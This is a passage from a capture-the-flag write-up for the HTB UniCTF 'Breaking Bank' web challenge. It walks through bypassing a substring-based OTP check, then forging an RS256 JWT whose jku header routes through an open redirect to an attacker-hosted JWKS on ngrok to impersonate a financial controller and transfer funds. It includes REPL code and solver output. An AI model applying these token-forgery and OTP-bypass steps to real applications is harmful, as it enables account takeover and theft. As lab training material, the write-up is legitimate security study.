</code></pre></div><p>This middleware is not secure, due to the use of <code>otp.includes</code> (the <code>TODO</code> comment might be a hint). Assuming that the expected OTP code is <code>1337</code>, the problem here is that the function doesn&rsquo;t check that the received OTP code is exactly <code>1337</code>. An OTP like <code>000013379999</code> will also pass the check!</p><p>Therefore, when providing the OTP, we can simply put all possible numbers from <code>0000</code> to <code>9999</code> together so that we always pass the check. We could have improved the size of the string using a <a target="_blank" href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">De Bruijn sequence</a>, but why should we to complicate things?</p><h2 id="solution">Solution</h2><p>Once we have analyzed the relevant code, let&rsquo;s think of a way to impersonate <code>FINANCIAL_CONTROLLER_EMAIL</code> in order to perform the transaction.</p><h3 id="jwks-forgery">JWKS forgery</h3><p>We only need to find a way to break into <code>FINANCIAL_CONTROLLER_EMAIL</code>&rsquo;s session. For this, we need to forge a valid JWT token. When JWKS is used, normally we need to modify the <code>jku</code> so that it points to a controlled JWKS. For more information, you can check <a target="_blank" href="https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#jwks-spoofing">HackTricks</a>, or my writeup for <a target="_blank" href="https://7rocky.github.io/en/htb/unicode/#forging-a-jwt-token">Unicode</a>, where I go over the same problem.</p><p>Since the server checks that the <code>jku</code> starts with <code>http://127.0.0.1:1337/</code>, we must use an existing endpoint on the server. We could have abused the HTTP URI format <code>http://username:password@ip:port/path</code> if the server hadn&rsquo;t checked the trailing <code>/</code>. But that&rsquo;s not the situation. Here we need to find a way to upload files, or an Open Redirect.</p><p>Actually, if we search for <code>redirect</code> there is a function that directly allows this (<code>challenge/server/routes/analytics.js</code>), with another <code>TODO</code> comment:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk9 mtki">fastify</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/redirect'</span><span class="mtk1">, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">reply</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">url</span><span class="mtk1">, </span><span class="mtk1">ref</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.query;</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">url</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1">ref</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk4">'Missing URL or ref parameter'</span><span class="mtk1"> });</span>  
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk3">// TODO: Should we restrict the URLs we redirect u</span><span class="mtk3">sers to?</span>
<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">trackClick</span><span class="mtk1">(</span><span class="mtk1">ref</span><span class="mtk1">, </span><span class="mtk7">decodeURIComponent</span><span class="mtk1">(</span><span class="mtk1">url</span><span class="mtk1">));</span>
<span class="mtk1">            </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">header</span><span class="mtk1">(</span><span class="mtk4">'Location'</span><span class="mtk1">, </span><span class="mtk7">decodeURIComponent</span><span class="mtk1">(</span><span class="mtk1">url</span><span class="mtk1">)).</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">302</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">();</span>
<span class="mtk1">        } </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">error</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">'[Analytics] Error during redirect:'</span><span class="mtk1">, </span><span class="mtk1">error</span><span class="mtk1">.message);</span>
<span class="mtk1">            </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk4">'Failed to track analytics data.'</span><span class="mtk1"> });</span>
<span class="mtk1">        }</span>
<span class="mtk1">    });</span>
</code></pre></div><p>So, we found the intended way of forging the JWKS. Actually, there was another <code>TODO</code> comment on the <code>jku</code> check:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        </span><span class="mtk3">// TODO: is this secure enough?</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">jku</span><span class="mtk1">.</span><span class="mtk8">startsWith</span><span class="mtk1">(</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://127.0.0.1:1337/</span><span class="mtk4">'</span><span class="mtk1">)) {</span>
<span class="mtk1">            </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">'Invalid token: jku claim does not start with </span><span class="mtk4 detected-link">http://127.0.0.1:1337/</span><span class="mtk4">'</span><span class="mtk1">);</span>  
<span class="mtk1">        }</span>
</code></pre></div><h3 id="manual-solution">Manual solution</h3><p>Let&rsquo;s solve the challenge manually in order to automate it later. First of all, we can register an account and log in afterwards:</p><p><img alt="Breaking Bank 1" src="/images/other/HTB%20UniCTF/Breaking-Bank-1.webp"></p><p>At this point, we can see the JWT token at <code>localStorage</code>:</p><p><img alt="Breaking Bank 2" src="/images/other/HTB%20UniCTF/Breaking-Bank-2.webp"></p><p>We can get the <code>kid</code> from here, because it appears in the token header:</p><p><img alt="Breaking Bank 3" src="/images/other/HTB%20UniCTF/Breaking-Bank-3.webp"></p><p>Now, we need to create our own JWKS. We can take the server&rsquo;s JWKS as a guide:</p><p><img alt="Breaking Bank 4" src="/images/other/HTB%20UniCTF/Breaking-Bank-4.webp"></p><p>For this, let&rsquo;s create a pair of RSA keys using <code>pycryptodome</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
<span class="code-magenta">&gt;&gt;&gt; </span>from Crypto.PublicKey import RSA
<span class="code-magenta">&gt;&gt;&gt; </span>
<span class="code-magenta">&gt;&gt;&gt; </span>priv_key = RSA.generate(2048)
<span class="code-magenta">&gt;&gt;&gt; </span>pub_key = priv_key.public_key()
<span class="code-magenta">&gt;&gt;&gt; </span>
<span class="code-magenta">&gt;&gt;&gt; </span>pub_key
RsaKey(n=25314123931743675052824453981182977134436528688826952040447784440806161119243740704633906064190223800039418322338605157187053537541310458478556728149499187058443823246621483526704944071774405486623378267808083185245286094678628798643408640667746310984465385218669103648345014346901755719508615165063708012320195010741598928709355708088034519200615081939149878672369269392821760091518693661062225779193081546659230413648024127831194865050807930174942775465371018731591786695215101280485994426322383217615047979395537563250574747766603533608256882640685336277236530039467305324521671131327284376222530860119163258400601, e=65537)  
</code></pre></div><p>Now, we need to create the JWKS. We will need to Base64-encode the public RSA key as follows:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-magenta">&gt;&gt;&gt; </span>import json
<span class="code-magenta">&gt;&gt;&gt; </span>
<span class="code-magenta">&gt;&gt;&gt; </span>from Crypto.Util.number import long_to_bytes
<span class="code-magenta">&gt;&gt;&gt; </span>
<span class="code-magenta">&gt;&gt;&gt; </span>key = {
<span class="code-magenta">... </span>    'kty': 'RSA',
<span class="code-magenta">... </span>    'n': b64encode(long_to_bytes(int(pub_key.n))).decode(),  
<span class="code-magenta">... </span>    'e': b64encode(long_to_bytes(int(pub_key.e))).decode(),
<span class="code-magenta">... </span>    'alg': 'RS256',
<span class="code-magenta">... </span>    'use': 'sig',
<span class="code-magenta">... </span>    'kid': 'e5bd31a5-ad9c-48dd-bd2b-c17f3e7a426d'
<span class="code-magenta">... </span>}
<span class="code-magenta">&gt;&gt;&gt; </span>
<span class="code-magenta">&gt;&gt;&gt; </span>with open('jwks.json', 'w') as f:
<span class="code-magenta">... </span>    json.dump({'keys': [key]}, f, indent=2)
<span class="code-magenta">... </span>
<span class="code-magenta">&gt;&gt;&gt; </span>
</code></pre></div><p>At this point, we can start a Python server to serve the <code>jwks.json</code> file and expose the server with <code>ngrok</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ngrok</span> http 8000
<span class="code-cyan">ngrok</span>

<span class="code-dark-magenta">Sign up to try new private endpoints https://ngrok.com/new-features-update?ref=private</span>

<span class="code-dark-green">Session Status                online</span>
<span class="code-white">Account                       Rocky (Plan: Free)</span>
<span class="code-white">Version                       3.18.4</span>
<span class="code-white">Region                        United States (us)</span>
<span class="code-white">Web Interface                 http://127.0.0.1:4040</span>
<span class="code-white">Forwarding                    https://abcd-12-34-56-78.ngrok-free.app -&gt; http://localhost:8000</span>  

<span class="code-white">Connections                   ttl     opn     rt1     rt5     p50     p90     </span>
<span class="code-white">                              0       0       0.00    0.00    0.00    0.00    </span>
</code></pre></div><p>Next, we need to forge a JWT token as <code>FINANCIAL_CONTROLLER_EMAIL</code> with our controlled <code>jku</code> with the Open Redirect:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-magenta">&gt;&gt;&gt; </span>target_email = 'financial-controller@frontier-board.htb'
<span class="code-magenta">&gt;&gt;&gt; </span>ngrok = 'https://abcd-12-34-56-78.ngrok-free.app'
<span class="code-magenta">&gt;&gt;&gt; </span>jku = f'http://127.0.0.1:1337/api/analytics/redirect?url={ngrok}/jwks.json&ref=x'
<span class="code-magenta">&gt;&gt;&gt; </span>kid = 'e5bd31a5-ad9c-48dd-bd2b-c17f3e7a426d'
<span class="code-magenta">&gt;&gt;&gt; </span>
<span class="code-magenta">&gt;&gt;&gt; </span>import jwt
<span class="code-magenta">&gt;&gt;&gt; </span>
<span class="code-magenta">&gt;&gt;&gt; </span>target_token = jwt.encode(
<span class="code-magenta">... </span>        payload={'email': target_email},
<span class="code-magenta">... </span>        key=priv_key.export_key().decode(),
<span class="code-magenta">... </span>        algorithm='RS256',
<span class="code-magenta">... </span>        headers={'kid': kid, 'jku': jku}
<span class="code-magenta">... </span>    )
<span class="code-magenta">&gt;&gt;&gt; </span>
<span class="code-magenta">&gt;&gt;&gt; </span>target_token
'eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6MTMzNy9hcGkvYW5hbHl0aWNzL3JlZGlyZWN0P3VybD1odHRwczovL2FiY2QtMTItMzQtNTYtNzgubmdyb2stZnJlZS5hcHAvandrcy5qc29uJnJlZj14Iiwia2lkIjoiZTViZDMxYTUtYWQ5Yy00OGRkLWJkMmItYzE3ZjNlN2E0MjZkIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6ImZpbmFuY2lhbC1jb250cm9sbGVyQGZyb250aWVyLWJvYXJkLmh0YiJ9.gY90H6sdU-OEmp-U-jbzF8QkTlmOrA9vEA7TEng1X69bI7MEpReGZ0632PmL7oqbDENGZPYXCVUmQkYon84kfc16c4fhJX3BPgjVI1wUiUiMaKdtwZnPo_A5p-DyOE76NlrtF2S6b9HWchvhGP2hZi77Gt2Imm8m6qk-oaHT0pqdhmKbzxuHyW3lsxOtOGUtUE8qYJ9P6bDS5utmCVUG73D-OOGlvUPeHjW3w10ZBxWNBEsGINCCGswZzeghavVu28hsxoJfxUayzazZhmgx1I9JTFXotRaMKbvCG21_m9oUBbn2ziny3Oq3V69qa-zgy3YQxDjBtXax6GPPtPT4GvQ'  
</code></pre></div><p>Now we can update <code>localStorage</code> and we will become <code>FINANCIAL_CONTROLLER_EMAIL</code>. A proof of this is that we can see their balance when navigating to &ldquo;Transactions&rdquo;:</p><p><img alt="Breaking Bank 5" src="/images/other/HTB%20UniCTF/Breaking-Bank-5.webp"></p><p>At this point we only need to perform a transaction to us (<code>asdf@asdf.com</code>). Notice that although the UI says we need to be friends to do the transaction, it is not checked on the backend. However, to send the request from the UI, we need to be friends. We can use an incognito tab to log in into our account.</p><p><img alt="Breaking Bank 6" src="/images/other/HTB%20UniCTF/Breaking-Bank-6.webp"></p><p>Once we are friends, we can select the email recipient and the amount to transfer:</p><p><img alt="Breaking Bank 7" src="/images/other/HTB%20UniCTF/Breaking-Bank-7.webp"></p><p>But we need to enter the OTP code:</p><p><img alt="Breaking Bank 8" src="/images/other/HTB%20UniCTF/Breaking-Bank-8.webp"></p><p>Remember the trick to bypass it. We can enter a dummy OTP code and then change the request:</p><p><img alt="Breaking Bank 9" src="/images/other/HTB%20UniCTF/Breaking-Bank-9.webp"></p><p><img alt="Breaking Bank 10" src="/images/other/HTB%20UniCTF/Breaking-Bank-10.webp"></p><p>At this point, we will see the flag on the dashboard:</p><p><img alt="Breaking Bank 11" src="/images/other/HTB%20UniCTF/Breaking-Bank-11.webp"></p><h3 id="automated-solution">Automated solution</h3><p>I decided to program all the process in a single Python script. There is no manual task except for starting <code>ngrok</code> on port 8000.</p><p>Let&rsquo;s restart the Docker container and try it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1337 https://abcd-12-34-56-78.ngrok-free.app
[<span class="code-blue">*</span>] Registering account: asdf@asdf.com
[<span class="code-green">+</span>] Token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ijc3YTBiYzRlLTAxNmEtNGMwNS1iNzI3LTJjZjc0ZmVlZWExZCIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6MTMzNy8ud2VsbC1rbm93bi9qd2tzLmpzb24ifQ.eyJlbWFpbCI6ImFzZGZAYXNkZi5jb20iLCJpYXQiOjE3MzQ2MjQwMjl9.hw_Z6wVzwOCHLEbJmyrERqISDt5PSF2B8vP1kfUaXVkvEAc_2qT27e7I0wUckzaghRZeRs-PgkCEWnRbpgrz5FFfXwBYPw892tfYBV5wF8KAkHHNIG71aEtuSk9oK_IqFLDgDqBPGKzCR5zosxC28wAeznL40kTHN651Xrbrg3KbjAG70XpOBx2hlCY5UliCx2SDBgXEMq74ObymSPWVJLhat1PIIUcPVfuFMsJ-4_e8RsyIMdtkPfjB010wscM7nf6iq2AJalmtL79W5Jqh5aNIheoJ-KEOcasHGcj9jciHIreH1RM9lnPaHeZuvy0OIYzePaqD8DBCHR8ILzZh_A
[<span class="code-blue">*</span>] Generating malicious jwks...
[<span class="code-blue">*</span>] Found kid: 77a0bc4e-016a-4c05-b727-2cf74feeea1d
[<span class="code-green">+</span>] Target token: eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6MTMzNy9hcGkvYW5hbHl0aWNzL3JlZGlyZWN0P3VybD1odHRwczovL2FiY2QtMTItMzQtNTYtNzgubmdyb2stZnJlZS5hcHAvandrcy5qc29uJnJlZj14Iiwia2lkIjoiNzdhMGJjNGUtMDE2YS00YzA1LWI3MjctMmNmNzRmZWVlYTFkIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6ImZpbmFuY2lhbC1jb250cm9sbGVyQGZyb250aWVyLWJvYXJkLmh0YiJ9.mBFY21SVsr_8akybnJzy1-BqjT4jgujuCxp8toAEC32ipr9V3T1M9jhgoU_MB46i3G5OTgb-O3Q3bQTgC-OVI9IIRBoseBtD-rT2F1LSMXQvCkvjEaZzcQpT-n-H1UJ8dgAl_loZ-lP98fBT5qg9x_w1CRyBfp8FGDurNnyJvnc2rO4k4mJIvx_I7q4ExqD6cPc0lUXtEwc7tgJUl_zUkQtRej98GqWZG0gk1P1Whs6OFz0azRWNhw5MTEsiBE80jlM_mVdcv9FVTdr6BVLVeDPgPYHgy2Zo888QqpUzrvYxBYiC3MWMhaA0xTexlHDoblnxyedFbsifkBQUFxP2sA
[<span class="code-blue">*</span>] Target balance: 27886692158 CLCR
[<span class="code-blue">*</span>] Transaction successful
[<span class="code-green">+</span>] Flag: HTB{f4k3_fl4g_f0r_t35t1ng}
</code></pre></div><h2 id="flag">Flag</h2><p>Now, let&rsquo;s run the script on the remote instance to get the flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 94.237.61.84:50569 https://abcd-12-34-56-78.ngrok-free.app
[<span class="code-blue">*</span>] Registering account: asdf@asdf.com
[<span class="code-green">+</span>] Token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjM4ZTQ3ZDhmLWUxM2EtNDE5My05NTcxLTc3OWU5MGFiNTY5NiIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6MTMzNy8ud2VsbC1rbm93bi9qd2tzLmpzb24ifQ.eyJlbWFpbCI6ImFzZGZAYXNkZi5jb20iLCJpYXQiOjE3MzQ1MzY2NTR9.M7x-I1_annu10xtapy3CGT7WqhfZ8sDWGq_FMlsZAz1bs227bXWLxkpqGF4w-m2ONGktEXyJhsnEpc8pXhISd-LRq6xGGsS1PrukLCGaHaKdOUrmFL1raXZ5DQvWR5QUxlE-z4H_ED7DgovLb6YswOH9VwX9E56rGGT7GFHjuQ3A4lj4vM1dkr1rdrPEosk4tPhjMDXAr57lvyKuYDIKozxF9amuBo4hM6ycI_OkcdW-5fVOWLPnmaqWlBR58B0EfC285lCik4HV1klhy3xt7qBYxoUZt4Xw2ow9lBZNv7rUeWUMhY3MJpgR6NSdpUEMBNXrdV7uzSACx-XRZzbNVA
[<span class="code-blue">*</span>] Generating malicious jwks...
[<span class="code-blue">*</span>] Found kid: 38e47d8f-e13a-4193-9571-779e90ab5696
[<span class="code-green">+</span>] Target token: eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6MTMzNy9hcGkvYW5hbHl0aWNzL3JlZGlyZWN0P3VybD1odHRwczovL2FiY2QtMTItMzQtNTYtNzgubmdyb2stZnJlZS5hcHAvandrcy5qc29uJnJlZj14Iiwia2lkIjoiMzhlNDdkOGYtZTEzYS00MTkzLTk1NzEtNzc5ZTkwYWI1Njk2IiwidHlwIjoiSldUIn0.eyJlbWFpbCI6ImZpbmFuY2lhbC1jb250cm9sbGVyQGZyb250aWVyLWJvYXJkLmh0YiJ9.opuJBVVJKgKggC1QM1omcVEJG1_x5Y2TdXUfYM6v0aaYmIT0rbiXMi_RlAhHqVOPP-kg_6VkYuyfqV27DjAxNLEXKI7TZueLv0gB9v2S4KshNyLg-kBpq-CTKo-9BcjvEKM_-5nn25nyHSg5letwvP58f4tB3rDDFdz0X1hNNrwDMLXG5ARCY9iDwD0MTIUaL5qW1QpPfah6zUygOVwqGA9_B1GhRjyjhOK3yLWvn7c-emVB4NCuziI57-4iEHQe_HHjSLoL7QVVfDs9g3Hp8V1ptc9riFF_IGHHFGgfr7Yy8CbomyO-kRgAsTJATdvcIk2GcR_sld0fm4mTl--1iQ  
[<span class="code-blue">*</span>] Target balance: 31897108123 CLCR
[<span class="code-blue">*</span>] Transaction successful
[<span class="code-green">+</span>] Flag: HTB{rugg3d_pu11ed_c0nqu3r3d_d14m0nd_h4nd5_74245cdadddc0d05384b661c3b692eff}
</code></pre></div><p>The full script can be found in here: <a target="_blank" href="https://github.com/7Rocky/CTF-scripts/tree/main/HTB%20UniCTF/Web/Breaking%20Bank/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#source-code-analysis">Source code analysis</a><ul><li><a href="#finding-the-objective">Finding the objective</a></li><li><a href="#session-management">Session management</a></li><li><a href="#otp-implementation">OTP implementation</a></li></ul></li><li><a href="#solution">Solution</a><ul><li><a href="#jwks-forgery">JWKS forgery</a></li><li><a href="#manual-solution">Manual solution</a></li><li><a href="#automated-solution">Automated solution</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>